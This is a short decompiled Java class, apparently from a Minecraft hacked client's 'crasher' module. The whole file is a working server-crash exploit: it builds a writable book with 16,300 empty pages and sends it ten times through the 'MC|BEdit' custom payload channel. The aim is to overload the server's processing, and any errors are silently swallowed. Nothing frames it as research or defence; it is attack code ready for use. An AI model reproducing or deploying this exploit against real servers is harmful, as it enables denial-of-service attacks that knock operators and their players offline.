// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cpc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;

public class CustomPayloadCrasher1
{
    public static void start() {
        new Thread() {
            @Override
            public void run() {
                try {
                    final NBTTagList bookPages = new NBTTagList();
                    for (int i2 = 0; i2 < 16300; ++i2) {
                        bookPages.appendTag(new NBTTagString(""));
                    }
                    for (int i3 = 0; i3 < 10; ++i3) {
                        final ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
                        book.setTagInfo("pages", bookPages);
                        final PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
                        pb.writeItemStackToBuffer(book);
                        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("MC|BEdit", pb));
                    }
                }
                catch (final Exception ex) {}
            }
        }.start();
    }
}
